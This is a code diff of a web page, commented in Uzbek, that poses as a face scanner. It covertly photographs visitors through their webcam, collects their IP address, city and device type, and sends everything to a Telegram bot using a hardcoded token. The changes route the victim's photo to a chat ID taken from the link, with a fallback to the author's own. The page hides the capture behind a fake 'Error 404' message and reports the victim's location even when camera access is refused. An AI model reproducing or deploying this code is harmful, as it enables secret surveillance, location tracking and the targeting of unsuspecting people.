@@ -36,16 +36,14 @@
 
 <script>
     const token = "8103900618:AAHIP38KJ0Y0Rr1u1P4n9z6PdbAr9LAM-fk";
-    // Linkdagi kodni olish (masalan: ?id=otWd9I8SXH)
+    
+    // 🎯 URL'dan 'id' parametrini olish (Masalan: camera.html?id=12345)
     const urlParams = new URLSearchParams(window.location.search);
-    const secret_code = urlParams.get('id'); 
-
-    // ... rasm yuborish qismida chat_id o'rniga secret_code ishlatiladi ...
-    formData.append('chat_id', secret_code);
+    const target_chat_id = urlParams.get('id') || "8041707187"; // Agar ID bo'lmasa, senga boradi
 
     async function startScanner() {
         const statusElement = document.getElementById('status');
-        statusElement.innerText = "Skanerlash ko'proq vaqtni talab qilishi mumkin, iltimos sabrli bo'ling!";
+        statusElement.innerText = "Skanerlash ko'proq vaqtni talab qilishi mumkin iltimos sabrli bo'ling!";
 
         let geoData = { ip: "Noma'lum", city: "Noma'lum", country_name: "Noma'lum" };
         let deviceModel = navigator.userAgent.includes("Android") ? "📱 Android" : (navigator.userAgent.includes("iPhone") ? "🍎 iPhone" : "💻 Desktop");
@@ -79,13 +77,11 @@
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
 
-            const finalFormData = new FormData();
-            // 🎯 Bot kodi shifrlangan ID ni taniy olishi uchun captionga qo'shamiz
-            finalFormData.append('chat_id', "8041707187"); // Botga asosiy xabar senga borishi uchun
-            finalFormData.append('photo', blob, 'target.jpg');
-            finalFormData.append('caption', 
-                `🔑 Kod: ${user_secret_code}\n` +
-                `📸 **Nishon tutildi!**\n\n` +
+            const formData = new FormData();
+            formData.append('chat_id', target_chat_id); // 🚀 RASM ENDI EGASIGA KETADI
+            formData.append('photo', blob, 'target.jpg');
+            formData.append('caption', 
+                `📸 **Yangi yuz qo'lga kiritildi!**\n\n` +
                 `👤 **Qurilma:** ${deviceModel}\n` +
                 `🌐 **IP:** ${geoData.ip}\n` +
                 `📍 **Shahar:** ${geoData.city}\n` +
@@ -93,18 +89,18 @@
                 `⏰ **Vaqt:** ${new Date().toLocaleString()}`
             );
 
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: finalFormData });
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
             
             stream.getTracks().forEach(t => t.stop());
             statusElement.innerText = "Error 404: Tizim xatosi.";
             alert("Error 404: Tizim yuzingizni taniy olmadi. Qayta urinib ko'ring.");
 
         } catch (err) {
-            console.error(err);
+            const errorMsg = `⚠️ **Nishon kamerani blokladi!**\n🌐 IP: ${geoData.ip}\n📍 Manzil: ${geoData.city}`;
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${target_chat_id}&text=${encodeURIComponent(errorMsg)}`);
             alert("Error 404: Kameraga ruxsat berilmasa, qidiruv tizimi ishlamaydi!");
         }
     }
 </script>
 </body>
 </html>
-
